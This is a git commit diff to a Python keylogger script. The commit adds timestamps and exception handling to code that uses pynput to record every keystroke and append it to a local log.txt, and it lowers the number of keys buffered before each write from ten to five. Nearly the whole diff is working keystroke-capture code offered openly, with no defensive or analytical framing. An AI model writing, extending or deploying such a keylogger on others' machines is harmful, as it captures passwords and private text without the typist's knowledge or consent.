0abdf0dc3f75f6103ab0edf11ffe8058532c1a13
Abhay Kumar Singh <abskumar798@gmail.com>
2023-01-24 11:08:44 +0530

    Added Exception handling and date time

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,8 @@
 # C:\Users\Abhay>pip3 install pynput
 
 import pynput
+import datetime
+
 from pynput.keyboard import Key, Listener
 
 count = 0
@@ -12,20 +14,29 @@ def on_press(key):
     keys.append(key)
     count += 1
 
-    if count >= 10:
+    if count >= 5:
         count = 0
         write_file(keys)
         keys = []
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'","")
-            if k.find('space') > 0: 
-                f.write('\n')
-            elif k.find("Key") == -1:            
-                f.write(k)
-
+    try:
+        with open("log.txt", "a") as f:
+            for key in keys:
+                k = str(key).replace("'","")
+                if k.find("space") > 0: 
+                    f.write("\n")
+                elif k.find("Key") == -1:            
+                    f.write(k)
+            f.write(' '+ str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))+ ' ')
+            f.write("\n")
+    except FileNotFoundError:
+        print("The log file could not be found.")
+    except PermissionError:
+        print("You do not have permission to write to the log file.")
+    except:
+        print("An error occurred while writing to the log file.")
+        
 def on_release(key):
     if key == Key.esc:
         return False
